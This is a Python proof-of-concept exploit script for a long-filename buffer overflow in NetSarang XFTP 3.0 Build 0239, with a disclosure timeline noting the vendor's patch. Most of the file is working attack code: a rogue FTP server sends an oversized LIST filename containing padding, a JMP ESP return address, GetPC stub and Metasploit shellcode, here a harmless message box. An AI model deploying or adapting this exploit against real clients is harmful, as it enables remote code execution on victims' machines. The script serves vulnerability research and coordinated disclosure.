#!/usr/bin/python

import socket
import sys

"""
|------------------------------------------------------------------|
|                         __               __                      |
|   _________  ________  / /___ _____     / /____  ____ _____ ___  |
|  / ___/ __ \/ ___/ _ \/ / __ `/ __ \   / __/ _ \/ __ `/ __ `__ \ |
| / /__/ /_/ / /  /  __/ / /_/ / / / /  / /_/  __/ /_/ / / / / / / |
| \___/\____/_/   \___/_/\__,_/_/ /_/   \__/\___/\__,_/_/ /_/ /_/  |
|                                                                  |
|                                       http://www.corelan.be:8800 |
|                                                                  |
|-------------------------------------------------[ EIP Hunters ]--|

XFTP 3.0 Build 0239 Long filename Buffer Overflow
Tested on: BT4 (attacker) + Windows XP SP3 ENG (victim) + XFTP 3.0 Build 0239 or 0238
Found and coded by sinn3r  -  x90.sinner{at}gmail{d0t}c0m
Issue fixed in version : v3.0 Build 0242 & 0243
Greetz: Corelan Security & Exploit-DB.com
http://twitter.com/_sinn3r
Thanks : Corelan Security would like to thank NetSarang, Inc. for working with us and
         resolving the issue; Special thanks to Andrew Chang for communication.
	 Also thanks to corelanc0d3r

Description:
NetSarang XFTP 3.0 is a FTP client that is vulnerable to a buffer overflow when handling
a long file name retrieved using "LIST". In order to trigger the overflow, the attacker
must serve the malicious response as a FTP server, and trick the victim into double
clicking on the filename.  This proof of concept uses ACTIVE mode to transfer. If the
first LIST transfer fails, reconnect again.

Please Note :
1) Script provided 'as is', without any warranty. Use for educational
   purposes only.  Do not use this code to do anything illegal.
2) You are not allowed to edit/modify this code. If you do, Corelan cannot be
   held responsible for any damages this may cause.

Timeline:
05/17/10   - Vendor contacted
05/25/10   - Reminder sent
05/26/10   - Patched version received (v3.0 0242)
05/31/2010 - Xftp 3.0 Build 0243 released.  Public.

For more technical details, visit:
http://www.corelan.be:8800/advisories.php?id=CORELAN-10-046
"""

## ./msfpayload windows/messagebox exitfunc=thread TEXT="by sinn3r" TITLE="Demo by Corelan"
messagebox = (
"PYIIIIIIIIIIQZVTX30VX4AP0A3HH0A00ABAABTAAQ2AB2BB0BBXP8ACJJIHYJKMK8Y2T7TZTP1XRNRRZVQ9YSTL"
"KT1VPLKSFDLLKSFULLKG6THLK3NQ0LK7FP80OUH2UL3V95Q8QKOM1CPLK2LFD6DLKW5GLLK1DUU48C1JJLKQZUHL"
"K1JWP31ZKKSVWG9LKP4LKEQJNP1KO6Q9PKLNLMTIP2TDJIQXOTMC1HGM9L1KOKOKOGKSLFDQ8RUYNLK0ZVDS1JKU"
"6LKTLPKLK0ZELUQJKLKUTLK5QM8MYPDVDEL3QO3OB5XQ9YDMYZEK9O2RHLNPNDNZL62KXMLKOKOKOK9QUUTOKZO8"
"NKPSPLGULWTPRZHLKKOKOKOLIW5THBH2LRL7PKO58VS6RVNU4CXT5T3CUCBK8QL7TUZMYM6PVKOV55TMYHBF0OKO"
"XY20MOLLG5LFD0RM8QNKOKOKO582LSQ2NPXU8QS2OBRSUE8GPSRSIQ058G42ERMRO6Q9KMXQLWT4OK9JC3X2R68W"
"P10SX592NRNVSE8U2BY7PRSVQIYMX0LQ439K9KQFQYBQB63PQPRKON06QIPPPKOF5UXEZA"
);

## EAX getPC
getpc= (
"\x75\x03\x58\xff\xd0\xe8\xf8\xff"
"\xff\xff"
);

## The filename which contains our malicious code
## Peter's test: offset=232 bytes to EIP
evil = (
"\x41"*224+
"\xa9\x31\xe3\x74"	#0x74E331A9 JMP ESP RICHED20.dll
"\x90\x90\x90\x90"
"\xa9\x31\xe3\x74"+	#0x74E331A9 JMP ESP RICHED20.dll
"\x90"*12+		#Alignment
getpc+
messagebox+		#MessageboxA shellcode
"\x90"*100              #NOPs
);

## Main FTP server
## If the 1st LIST transfer fails, try again.
def ftp():
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.bind(("0.0.0.0", 21))
	print "[*] Port 21 up. ph33r!"
	s.listen(10)
	rport = 0
	addr  = ""
	while 1:
		c, addr = s.accept()
		c.send("200 Hola Mundo!\r\n")
		print "[*] %s connected" %addr[0]
		while 1:
			data = c.recv(1024)
			if "USER" in data:
				c.send("331 OK\r\n")
				print "[*] 331 USER = %s" %data.split(" ")[1],
			elif "PASS" in data:
				c.send("230 OK\r\n")
				print "[*] 230 PASS = %s" %data.split(" ")[1],
			elif "PORT" in data:
				tmp = data.split(" ")[1].split(",")
				rport = int(tmp[4])*256+int(tmp[5])
				c.send("200 OK\r\n")
				print "[*] 200 PORT set to %s" %rport
			elif "TYPE" in data:
				c.send("200 OK\r\n")
				print "[*] 200 TYPE"
			elif "PWD" in data:
				c.send("257 \"/\" is current directory\r\n")
				print "[*] 257 PWD"
			elif "CWD" in data:
				c.send("257 \"/\" is current directory\r\n")
				print "[*] 257 CWD"
			elif "SYST" in data:
				c.send("215 UNIX Type: L8\r\n")
				print "[*] SYST 215"
			elif "LIST" in data:
				dir = "-rw-rw-r--    1 1176     1176         1060 Apr 23 23:17  %s.bin\r\n\r\n"
				c.send("150 OK.\r\n226 Directory ok\r\n")
				_s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
				_s.connect((addr[0], rport))
				_s.send(dir %evil)
				_s.close()
				print "[*] LIST sent. Check messagebox."
				c.close()
				break
			else:
				try:
					c.send("500 Meh...\r\n")
				except:
					c.close()
					break

def main():
	try:
		ftp()
	except KeyboardInterrupt:
		print "\r\n[*] Adios!"
		sys.exit(0)

if __name__ == "__main__":
	print "|------------------------------------------------------"
	print "|  XFTP 3.0 Build 0239 Long filename Buffer Overflow  |"
	print "|  coded by sinn3r               twitter.com/_sinn3r  |"
	print "|-----------------------------------------------------|"
	main()